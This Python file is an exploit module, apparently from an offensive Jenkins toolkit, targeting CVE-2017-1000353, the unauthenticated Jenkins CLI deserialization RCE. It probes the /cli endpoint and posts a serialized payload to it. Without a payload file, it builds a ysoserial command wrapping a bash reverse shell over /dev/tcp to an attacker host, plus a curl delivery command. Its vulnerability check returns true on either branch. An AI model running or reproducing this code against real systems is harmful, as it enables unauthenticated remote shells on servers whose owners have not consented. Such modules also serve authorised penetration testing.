"""
CVE-2017-1000353: Jenkins CLI Java Deserialization RCE

An unauthenticated remote code execution vulnerability that allows attackers to transfer
a serialized Java SignedObject to the remoting-based Jenkins CLI, which is deserialized
using a new ObjectInputStream, bypassing the existing blocklist-based protection mechanism.

This is one of the most critical Jenkins vulnerabilities as it allows unauthenticated RCE.
"""

from pathlib import Path
from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2017_1000353(ExploitModule):
    """Jenkins CLI Java deserialization for unauthenticated RCE."""

    CVE_ID = "CVE-2017-1000353"

    METADATA = ExploitMetadata(
        cve_id="CVE-2017-1000353",
        name="Jenkins CLI Java Deserialization RCE",
        description="Unauthenticated RCE via Java deserialization in remoting-based CLI",
        affected_versions=["<= 2.56", "<= 2.46.1 LTS"],
        mitre_attack=["T1190", "T1059"],
        severity="critical",
        references=[
            "https://jenkins.io/security/advisory/2017-04-26/",
            "https://nvd.nist.gov/vuln/detail/CVE-2017-1000353",
        ],
        requires_auth=False,
        requires_crumb=False,
        tags=["rce", "deserialization", "unauthenticated", "cli"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance has remoting-based CLI enabled.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if potentially vulnerable, False otherwise
        """
        try:
            response = session.get("/cli")

            if response.status_code == 200:
                if 'Jenkins-CLI' in response.headers.get('X-Jenkins', ''):
                    return True
                return True

            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2017-1000353 for unauthenticated RCE via CLI deserialization.

        This exploit requires a serialized Java payload (e.g., from ysoserial).

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (lhost, lport, payload_file)

        Returns:
            ExploitResult: Result of the exploit
        """
        lhost = kwargs.get('lhost', '127.0.0.1')
        lport = kwargs.get('lport', 4444)
        payload_file = kwargs.get('payload_file')

        try:
            response = session.get("/cli")

            if response.status_code != 200:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="CLI endpoint not accessible or disabled"
                )
        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Error accessing CLI endpoint: {e}",
                error=str(e)
            )

        if not payload_file:
            ysoserial_cmd = f"java -jar ysoserial.jar CommonsCollections1 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' > payload.ser"
            curl_cmd = f"curl -X POST {session.base_url}/cli --data-binary @payload.ser"

            return ExploitResult(
                exploit=self.CVE_ID,
                status="partial",
                details="Exploitation requires serialized Java payload. See data for manual steps.",
                data={
                    "target": session.base_url,
                    "cli_url": f"{session.base_url}/cli",
                    "ysoserial_command": ysoserial_cmd,
                    "curl_command": curl_cmd,
                    "msf_module": "exploit/linux/http/jenkins_cli_deserialization"
                }
            )

        try:
            payload_path = Path(payload_file)
            if not payload_path.exists():
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="error",
                    details=f"Payload file not found: {payload_file}"
                )

            payload = payload_path.read_bytes()

            response = session.post(
                "/cli",
                data=payload,
                headers={'Content-Type': 'application/octet-stream'}
            )

            if response.status_code in [200, 204]:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details="Serialized payload sent to CLI endpoint",
                    data={
                        "payload_size": len(payload),
                        "http_status": response.status_code,
                        "listener": f"{lhost}:{lport}"
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Payload sent but unexpected response: HTTP {response.status_code}"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Error sending payload: {str(e)}",
                error=str(e)
            )
